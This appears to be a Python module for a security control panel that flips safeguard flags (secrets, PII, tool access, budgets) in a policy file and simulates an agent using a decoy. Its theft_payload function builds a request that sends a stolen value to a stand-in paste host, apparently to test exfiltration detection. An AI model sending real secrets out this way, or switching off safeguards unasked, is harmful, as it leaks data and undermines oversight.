"""Hands-on actions for the panel: switch a safeguard in the policy file, and act as an agent that
uses a decoy. Both go through the same paths a real operator and a real agent would use."""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any

from ..core import yamlio

# Controls that live outside `semantic_controls`, by the policy key that holds their `enabled` flag.
TOP_LEVEL = {
    "secrets": "secrets",
    "pii": "pii",
    "signatures": "signatures",
    "tool_access": "tool_access",
    "pii_model": "pii_model",
    "budget": "budgets",
}


class NotSwitchable(ValueError):
    pass


def switchable(control: str, doc: dict[str, Any]) -> bool:
    return control in TOP_LEVEL or control in (doc.get("semantic_controls") or {})


def set_enabled(policy_file: Path, control: str, enabled: bool) -> None:
    """Flip one control's `enabled` flag in the policy file, atomically. The control layer hot-reloads it."""
    doc = yamlio.load(policy_file) or {}
    if control in TOP_LEVEL:
        node = doc.setdefault(TOP_LEVEL[control], {})
    elif control in (doc.get("semantic_controls") or {}):
        node = doc["semantic_controls"][control]
    else:
        raise NotSwitchable(f"{control!r} has no on/off switch in the policy")
    node["enabled"] = bool(enabled)
    yamlio.write_atomic(policy_file, doc)


def theft_payload(value: str) -> str:
    """What an agent sends when it moves a stolen value out through a tool."""
    return json.dumps({"url": "https://paste.example/new", "body": value})
